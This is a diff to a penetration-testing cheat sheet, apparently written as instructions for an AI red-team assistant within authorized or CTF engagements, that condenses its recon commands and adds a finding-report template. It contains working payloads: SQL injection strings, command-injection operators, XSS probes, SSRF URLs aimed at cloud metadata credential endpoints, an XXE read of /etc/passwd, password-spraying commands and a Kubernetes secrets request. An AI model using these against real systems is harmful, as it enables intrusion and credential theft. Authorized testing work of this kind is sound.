@@ -37,33 +37,28 @@ engagement. Confirm target ownership or CTF context before proceeding.
 
 ## Recon and Initial Access
 
-**Passive OSINT**
+**Passive OSINT** — use `subfinder`/`theHarvester` for subdomains/emails; `shodan`/`crt.sh` for exposed services; `trufflehog` for leaked git secrets.
 ```bash
 whois domain.com && dig domain.com ANY
-subfinder -d domain.com -silent              # passive subdomain enum
-curl -s "https://crt.sh/?q=%25.domain.com&output=json" | jq -r '.[].name_value' | sort -u
-theHarvester -d domain.com -b all            # emails, subdomains
-shodan search "org:Company Name"             # exposed services
-trufflehog https://github.com/company/repo  # leaked secrets in git
+subfinder -d domain.com -silent | tee subs.txt
+theHarvester -d domain.com -b all
+shodan search "org:Company Name"
+trufflehog https://github.com/company/repo
 ```
 
 **Active Scanning**
 ```bash
-nmap -sC -sV -oA scan target                # standard service scan
-nmap -p- -T4 -oA full target               # all ports
+nmap -sC -sV -p- -T4 -oA full target      # all ports + service detection
 rustscan -a target -- -sC -sV              # fast scan + nmap scripts
-gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt
-ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302,403
+ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302,403
 nuclei -u https://target -t ~/nuclei-templates/  # template-based vuln scan
 ```
 
 **Service-Specific Enum**
 ```bash
-enum4linux -a 10.10.10.10                   # SMB: users, shares, policies
-smbmap -H 10.10.10.10 -u user -p pass -R   # SMB: recursive share listing
-snmpwalk -v2c -c public 10.10.10.10        # SNMP: dump MIB tree
+enum4linux -a 10.10.10.10                  # SMB: users, shares, policies
 ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"  # LDAP dump
-redis-cli -h 10.10.10.10 INFO              # Redis: unauthenticated info
+snmpwalk -v2c -c public 10.10.10.10 && redis-cli -h 10.10.10.10 INFO
 ```
 
 ---
@@ -72,21 +67,18 @@ redis-cli -h 10.10.10.10 INFO              # Redis: unauthenticated info
 
 **Injection**
 ```bash
-sqlmap -u "http://target/page?id=1" --batch --dbs   # automated SQLi
-sqlmap -r request.txt -p param --level=5            # from Burp request file
-' OR '1'='1'--    # manual SQLi test payload
-; whoami          # command injection operators: ; | || & && ` $()
+sqlmap -u "http://target/page?id=1" --batch --dbs   # automated SQLi (-r request.txt for Burp)
+' OR '1'='1'--    # manual SQLi; command injection operators: ; | || & && ` $()
 ```
 
 **XSS / SSRF / XXE**
-```html
+```
+# XSS
 <script>alert(1)</script>  <img src=x onerror=alert(1)>  <svg onload=alert(1)>
-```
-```
-http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS SSRF
+# SSRF
+http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
 http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
-```
-```xml
+# XXE
 <?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
 ```
 
@@ -225,11 +217,7 @@ crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --continue-on-succe
 hydra -L users.txt -P passes.txt 10.10.10.10 http-post-form "/login:u=^USER^&p=^PASS^:Invalid"
 ```
 
-**Wordlist Generation**
-```bash
-cewl -d 2 -m 5 -w cewl.txt https://target.com  # scrape site wordlist
-crunch 8 10 -t Company@@@ -o custom.txt         # pattern-based wordlist
-```
+**Wordlist Generation** — `cewl -d 2 -m 5 -w cewl.txt https://target.com` (scrape site); `crunch 8 10 -t Company@@@ -o custom.txt` (pattern-based).
 
 ---
 
@@ -285,6 +273,18 @@ curl -k https://kubernetes.default.svc/api/v1/namespaces/default/secrets -H "Aut
 For each technique: state the **goal**, provide **exact commands** with placeholders, describe
 **expected output**, and identify the **next step** in the attack chain.
 When presenting multiple options, order by: stealth > reliability > speed.
+
+**Finding report template:**
+```
+[RED] FINDING: <title>
+Severity: Critical | High | Medium | Low
+MITRE ATT&CK: <Tactic> — <Technique ID, e.g. T1078>
+Detail: <what is vulnerable and how it would be exploited>
+Proof of concept:
+  1. <step 1>
+  2. <step 2>
+Remediation: <what to fix and how>
+```
 
 ---
 
